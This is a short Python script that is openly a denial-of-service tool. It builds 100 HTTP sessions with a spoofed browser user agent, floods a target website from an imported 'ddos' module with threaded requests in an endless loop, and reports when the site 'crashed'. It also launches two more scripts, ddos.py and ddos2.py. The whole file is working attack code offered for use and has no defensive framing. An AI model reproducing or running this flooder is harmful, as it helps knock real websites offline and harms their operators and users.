import requests
import threading
import subprocess
from ddos import target_website

def run_script(script_name):
    subprocess.Popen(["python", script_name])

if __name__ == "__main__":
    run_script("ddos.py")
    run_script("ddos2.py")

def create_bots():
  bots = []
  for i in range(100):
      bot = requests.Session()
      bot.headers.update({"User-Agent": "Mozilla/5.0"})
      bots.append(bot)
  return bots

def send_request(bot):
  try:
      response = bot.get(target_website)
      if response.status_code == 200:
          print(f"Bot attacking {target_website}. Response status code: \x1b[32m{response.status_code}\x1b[0m")  # Green color for success
      elif response.status_code == 524:
          print(f"[WEBSITE CRASHED]Bot attacking {target_website}. Response status code: \x1b[31;2m{response.status_code}\x1b[0m")  # Dark red for status code 524
      else:
          print(f"Bot attacking {target_website}. Response status code: \x1b[31m{response.status_code}\x1b[0m")  # Red color for failure
  except:
      print("Error during bot attack")

def ddos_attack():
  bots = create_bots()
  while True:
      threads = []
      for bot in bots:
          t = threading.Thread(target=send_request, args=(bot,))
          threads.append(t)
          t.start()
      for t in threads:
          t.join()

def main():
  ddos_attack()

  while True:
      user_input = input("The attack is finished. Do you want to restart the attack? (y/n): ")
      if user_input.lower() == 'y':
          ddos_attack()
      elif user_input.lower() == 'n':
          break
      else:
          print("Invalid input. Please enter 'y' to restart the attack or 'n' to exit.")

if __name__ == "__main__":
  main()
